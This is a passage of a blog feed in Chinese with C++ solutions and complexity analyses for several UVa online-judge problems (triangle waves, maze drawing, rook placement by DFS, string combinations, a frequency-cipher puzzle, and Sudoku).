class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>預處理時間複雜度為 $O(1)$ ($O(21)$可以直接視為常數)</p>
<p>每筆測資輸入時間複雜度為 $O(n)$ ($n = 52$)</p>
<p>每筆測資排序時間複雜度為 $O(nlogn)$</p>
<p>每筆測資輸出時間複雜度為 $O(n)$</p>
<p>每筆測資總時間複雜度為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 488</title>
    <url>/2021/03/23/UVa488/</url>
    <content><![CDATA[<h1 id="UVa-488"><a href="#UVa-488" class="headerlink" title="UVa 488"></a>UVa 488</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?488" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?488</a></p>
<p>輸入兩個整數 $a, f$ 表示三角形波的振幅以及頻率，請輸出該三角波</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,f,a;</span><br><span class="line"><span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(out)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			out=<span class="literal">true</span>;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;f;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;f ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			<span class="comment">// 上大三角 </span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=a ; j++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span> ; k&lt;=j ; k++)&#123;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;j;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 下小三角</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=a<span class="number">-1</span>,l=<span class="number">0</span> ; j&gt;=<span class="number">1</span> ; j--, l++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> k=a<span class="number">-1</span>-l ; k&gt;<span class="number">0</span> ; k--)&#123;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;j;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>每筆測試資料時間複雜度約為 $O(2f(a^2))$</p>
<p>總時間複雜度約為 $O(2tf(a^2))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa445</title>
    <url>/2020/07/02/UVa445/</url>
    <content><![CDATA[<h1 id="UVa445"><a href="#UVa445" class="headerlink" title="UVa445"></a>UVa445</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?445" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?445</a><br>給一字串包含一迷宮的地圖資訊，求地圖的樣子</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>依據題目對於地圖資訊的描述輸出相對應字元即可<br>數字部分可以另外用變數儲存，記得每次輸出完歸零</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> step;</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>((step=<span class="built_in">cin</span>.get())!=EOF)&#123;</span><br><span class="line">		<span class="keyword">if</span>(step==<span class="string">'\n'</span> || step==<span class="string">'!'</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(step&lt;=<span class="string">'9'</span> &amp;&amp; step&gt;=<span class="string">'0'</span>)&#123;</span><br><span class="line">			cnt+=(step-<span class="string">'0'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>((step&lt;=<span class="string">'Z'</span> &amp;&amp; step&gt;=<span class="string">'A'</span>) || step==<span class="string">'*'</span>)&#123;</span><br><span class="line">			<span class="keyword">while</span>(cnt)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;step;</span><br><span class="line">				cnt--;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(step==<span class="string">'b'</span>)&#123;</span><br><span class="line">			<span class="keyword">while</span>(cnt)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">				cnt--;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(len(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa639</title>
    <url>/2020/06/16/UVa639/</url>
    <content><![CDATA[<h1 id="UVa639"><a href="#UVa639" class="headerlink" title="UVa639"></a>UVa639</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?639" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?639</a><br>給一個 $n \times n$ 的棋盤，其中<code>.</code>表示空格子，<code>X</code>表示障礙物<br>如同西洋棋中城堡的走法，求在互不影響下，能在棋盤中放入最多多少城堡且互不影響</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>DFS走訪每個點，枚舉有放及沒放的結果，取最大值</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,ans=<span class="number">0</span>,rock=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">bool</span> put[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ok</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=y<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[x][i] == <span class="string">'X'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(put[x][i])</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[i][y] == <span class="string">'X'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(put[i][y])</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">pii <span class="title">Next</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(y+<span class="number">1</span>&gt;=n)&#123;</span><br><span class="line">		<span class="keyword">return</span> make_pair(x+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> make_pair(x,y+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(pii px)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x=px.first,y=px.second;</span><br><span class="line">	<span class="keyword">if</span>(x==n<span class="number">-1</span> &amp;&amp; y==n<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="comment">//end</span></span><br><span class="line">		<span class="keyword">if</span>(arr[x][y] == <span class="string">'X'</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span>(ok(x,y))</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(arr[x][y] == <span class="string">'.'</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(ok(x,y))&#123;</span><br><span class="line">			put[x][y]=<span class="literal">true</span>;</span><br><span class="line">			rock++;</span><br><span class="line">			ret=max(ret,dfs(Next(x,y)))+<span class="number">1</span>;</span><br><span class="line">			put[x][y]=<span class="literal">false</span>;</span><br><span class="line">			rock--;</span><br><span class="line">		&#125;		</span><br><span class="line">		ret=max(ret,dfs(Next(x,y)));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		ret=max(ret,dfs(Next(x,y)));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(put,<span class="literal">false</span>,<span class="keyword">sizeof</span>(put));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dfs(make_pair(<span class="number">0</span>,<span class="number">0</span>))&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>走訪點數量為 $n \times n$，每個點枚舉2種狀態<br>總複雜度 $O(2^{n^2})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa598</title>
    <url>/2021/04/27/UVa598/</url>
    <content><![CDATA[<h1 id="UVa-598"><a href="#UVa-598" class="headerlink" title="UVa 598"></a>UVa 598</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?598" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?598</a></p>
<p>給有一群字串，輸出這群字串的所有組合</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>這題跟問數字 $1$~$n$ 的所有組合是相同的問題，只是從數字變成字串而已，但是概念相同<br>因為求的是組合，所以過去出現過的組合就不能再以不同排列出現<br>也就是說要是我們已經枚舉過包含元素 $A$ 的所有組合，那下次元素 $A$ 就必定不能再使用<br>所以可以用一個變數 $start$ 紀錄上次最後用到哪個元素，下次枚舉就從 $start+1$ 開始即可</p>
<p>這題麻煩的是輸入有些複雜，可以使用 <code>stringstream</code> 處理輸入是 <code>a</code> 或是 <code>a b</code> 的情況</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m, a, b, R, res[<span class="number">20</span>];</span><br><span class="line"><span class="built_in">string</span> op, s, arr[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">bool</span> used[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == end)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;end ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i) <span class="built_in">cout</span>&lt;&lt;<span class="string">", "</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;arr[res[i]];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=start ; i&lt;R ; i++)&#123;</span><br><span class="line">		res[depth]=i;</span><br><span class="line">		DFS(depth+<span class="number">1</span>, i+<span class="number">1</span>, end);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// 輸入</span></span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">	<span class="keyword">while</span>(getchar() != <span class="string">'\n'</span>);</span><br><span class="line">	<span class="keyword">while</span>(getchar() != <span class="string">'\n'</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">0</span> ; t&lt;m ; t++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(t) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		R = <span class="number">0</span>;</span><br><span class="line">		getline(<span class="built_in">cin</span>, op);</span><br><span class="line">		<span class="keyword">while</span>(getline(<span class="built_in">cin</span>, s) &amp;&amp; s[<span class="number">0</span>]!=<span class="string">'\0'</span>)&#123;</span><br><span class="line">			arr[R] = s;</span><br><span class="line">			R++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 判斷所求是哪種</span></span><br><span class="line">		<span class="keyword">if</span>(op[<span class="number">0</span>] == <span class="string">'*'</span>)&#123;</span><br><span class="line">			a=<span class="number">1</span>, b=R+<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">stringstream</span> ss;</span><br><span class="line">			ss&lt;&lt;op;</span><br><span class="line">			ss&gt;&gt;a;</span><br><span class="line">			ss&gt;&gt;b;</span><br><span class="line">			<span class="comment">// 判斷有沒有 b</span></span><br><span class="line">			<span class="keyword">if</span>(ss.fail())&#123;</span><br><span class="line">				b=a+<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				b++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=a ; i&lt;b ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i&gt;a) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Size "</span>&lt;&lt;i&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			DFS(<span class="number">0</span>, <span class="number">0</span>, i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 468</title>
    <url>/2021/03/25/UVa468/</url>
    <content><![CDATA[<h1 id="UVa-468"><a href="#UVa-468" class="headerlink" title="UVa 468"></a>UVa 468</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?468" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?468</a></p>
<p>我們今天設計了一個新的加密方式，首先是先寫下明文 $P$</p>
<p>接下來我們會分析 $P$ 當中每個字母出現的頻率</p>
<p>接下來建立一個對照的字串 $S$ ， $S$ 當中每個字都會對應到 $P$ 的某個相同出現頻率的字</p>
<p>我們保證題目當中只會出現字母，並且每個字母的出現頻率都不相同</p>
<p>如果給你 $S$ 以及加密後的密文 $C$，你可以找到 $P$ 嗎?</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為每個字母出現的頻率都是獨特的，所以我們可以先分別統計 $P$ 和 $S$ 的每個字母出現次數</p>
<p>經過排序過後就可以很快對應出每個字母應該要對應到誰</p>
<p>最後建立一個對照表，輸出對著這張表就可以了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Max = <span class="number">1e9</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">char</span> tbl[<span class="number">128</span>];</span><br><span class="line"><span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 statistics 來進行次數統計</span></span><br><span class="line"><span class="comment">// 根據 cnt 來排序，也記錄下了統計的字母是誰</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">statistics</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> alpha;</span><br><span class="line">	<span class="comment">// 用一個極大值，使得這些不存在的字元排序後都會在最後方</span></span><br><span class="line">	<span class="keyword">int</span> cnt=Max;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(statistics p, statistics q)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p.cnt != q.cnt) <span class="keyword">return</span> p.cnt &lt; q.cnt;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 方便起見用 128</span></span><br><span class="line">		statistics text[<span class="number">128</span>], cipher[<span class="number">128</span>];</span><br><span class="line">		<span class="comment">// 只需要對 A~z 做初始化</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">65</span> ; i&lt;<span class="number">123</span> ; i++)&#123;</span><br><span class="line">			text[i].alpha = cipher[i].alpha = <span class="keyword">char</span>(i);</span><br><span class="line">			text[i].cnt = cipher[i].cnt = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			text[s[i]].cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			cipher[s[i]].cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		sort(text, text+<span class="number">128</span>, cmp);</span><br><span class="line">		sort(cipher, cipher+<span class="number">128</span>, cmp);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; cipher[i].cnt!=Max ; i++)&#123;</span><br><span class="line">			<span class="comment">// 建立對照表</span></span><br><span class="line">			tbl[cipher[i].alpha] = text[i].alpha;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;tbl[s[i]];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(len(P) + len(C))$</p>
<p>每筆測資統計時間複雜度為 $O(len(P) + len(C))$</p>
<p>每筆測資排序時間複雜度為 $O(2mlogm)$ ，其中 $m = 128$</p>
<p>每筆測資輸出時間複雜度為 $O(len(C))$</p>
<p>總時間複雜度約為 $n(2(len(P) + len(C)) + 2mlogm + len(C))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 989</title>
    <url>/2021/04/27/UVa989/</url>
    <content><![CDATA[<h1 id="UVa-989"><a href="#UVa-989" class="headerlink" title="UVa 989"></a>UVa 989</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?989" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?989</a></p>
<p>跟數獨問題相同，不過這次的版面大小可以從 $1 \times 1$ 到 $3 \times 3$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>記錄小正方形、行、列每個數字是否出現過，透過 DFS 枚舉每種可能</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, R, arr[<span class="number">9</span>][<span class="number">9</span>], nx[<span class="number">81</span>], ny[<span class="number">81</span>];</span><br><span class="line"><span class="keyword">bool</span> found, out=<span class="literal">false</span>, small_sq[<span class="number">9</span>][<span class="number">10</span>], row[<span class="number">9</span>][<span class="number">10</span>], col[<span class="number">9</span>][<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">10</span> ; j++)&#123;</span><br><span class="line">			small_sq[i][j] = <span class="literal">false</span>;</span><br><span class="line">			row[i][j] = <span class="literal">false</span>;</span><br><span class="line">			col[i][j] = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n*n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n*n ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i][j] != <span class="number">0</span>)&#123;</span><br><span class="line">				col[j][arr[i][j]]=<span class="literal">true</span>;</span><br><span class="line">				row[i][arr[i][j]]=<span class="literal">true</span>;</span><br><span class="line">				small_sq[n*(i/n) + j/n][arr[i][j]]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == R)&#123;</span><br><span class="line">		found = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n*n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n*n ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(j) <span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span 